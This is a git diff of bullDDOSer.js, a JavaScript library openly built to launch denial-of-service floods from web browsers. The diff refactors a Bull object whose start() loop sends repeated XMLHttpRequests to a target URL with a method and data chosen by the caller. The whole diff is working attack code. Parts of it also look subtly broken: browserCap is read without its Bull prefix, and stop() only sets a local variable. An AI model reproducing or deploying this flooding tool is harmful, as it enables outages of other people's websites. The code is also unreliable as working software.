@@ -1,5 +1,5 @@
 /*!
-bullddoser.js - v0.0.0
+bullddoser.js - v0.1.0
 Created by Gonçalo Sá on 2015-08-17.
 
 git://github.com/GNSPS/bullDDOSer.git
@@ -45,52 +45,13 @@ CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
         // Global
         root['bullddoser'] = factory();
     }
-}(this, function (target, method, data) {
+}(this, function () {
     "use strict";
     
-    function _config(target, method, data) {
-        /*jshint validthis: true */
-        if (typeof target !== "string") {
-            console.error("bullDDOSer: Invalid target argument. No change.");
-        }
-        else {
-            this.target = target;
-        }
-        if (typeof method !== "string") {
-            console.error("bullDDOSer: Invalid method argument. No change.");
-        }
-        else {
-            this.method = method;
-        }
-        if (typeof data !== "string") {
-            throw new Error("bullDDOSer: Invalid data argument. No change.");
-        }
-        else {
-            this.data = data;
-        }
-    }
-    
-    function _init() {
-        /*jshint validthis: true */
-        if (typeof this.target !== "string") {
-            throw new Error("bullDDOSer: Invalid target argument.");
-        }
-        if (typeof this.method !== "string") {
-            console.error("bullDDOSer: Invalid method argument.");
-            this.method = "GET";
-        }
-        if (typeof this.data !== "string") {
-            console.error("bullDDOSer: Invalid data argument.");
-            this.data = "";
-        }
-    }
-    
-    function Bull() {
-        /*jshint validthis: true */
-        var bullfighterWins = false;
+    function Bull(method, target, data) {
+        var bullfighterEnters = false;
         
         function Charge(method, target, data) {
-            /*jshint validthis: true */
             var http = new XMLHttpRequest(); 
 
             http.open(method, target, true); 
@@ -101,26 +62,23 @@ CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
         }
         
         function start() {
-            var bullfighterWins = false;
+            var bullfighterEnters = false;
             
             for(var i = 0; i < browserCap; i++) {
-                new Charge(this.method, this.target, this.data);
+                new Charge(method, target, data);
             }
         }
         
         function stop() {
-            var bullfighterWins = true;
+            var bullfighterEnters = true;
         }
     }
     
     Bull.browserCap = 6;
     
-    _init(target, method, data);
-    
     return {
-        config: _config,
-        create: function() {
-            return new Bull();
+        create: function(method, target, data) {
+            return new Bull(method, target, data);
         }
     };
 }));
